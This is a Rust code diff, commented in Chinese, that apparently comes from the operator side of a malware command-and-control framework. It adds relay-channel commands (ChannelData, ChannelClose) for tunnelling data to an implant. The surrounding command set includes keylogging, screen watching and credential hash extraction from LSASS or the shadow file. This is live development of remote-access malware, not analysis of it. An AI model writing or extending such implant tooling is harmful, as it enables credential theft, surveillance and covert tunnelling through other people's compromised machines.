@@ -776,6 +776,10 @@ enum JsonCommand {
     Screenwatch { interval_secs: u32 },
     /// 凭据哈希提取。method 0=LSASS 1=shadow。
     Hashdump { method: u8 },
+    /// 中继通道写数据（operator→implant 方向）。data_hex 为 hex 编码字节。
+    ChannelData { chan: u32, data_hex: String },
+    /// 关闭中继通道（显式拆除；implant 也会在 socket EOF 时自动关）。
+    ChannelClose { chan: u32 },
     Exit,
 }
 
@@ -837,6 +841,11 @@ impl JsonCommand {
             JsonCommand::Keylog { action } => Command::Keylog { action },
             JsonCommand::Screenwatch { interval_secs } => Command::Screenwatch { interval_secs },
             JsonCommand::Hashdump { method } => Command::Hashdump { method },
+            JsonCommand::ChannelData { chan, data_hex } => {
+                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
+                Command::ChannelData { chan, data }
+            }
+            JsonCommand::ChannelClose { chan } => Command::ChannelClose { chan },
             JsonCommand::Exit => Command::Exit,
         })
     }
@@ -1009,6 +1018,8 @@ fn command_name(c: &Command) -> &'static str {
         Command::Keylog { .. } => "keylog",
         Command::Screenwatch { .. } => "screenwatch",
         Command::Hashdump { .. } => "hashdump",
+        Command::ChannelData { .. } => "channeldata",
+        Command::ChannelClose { .. } => "channelclose",
         Command::Exit => "exit",
     }
 }
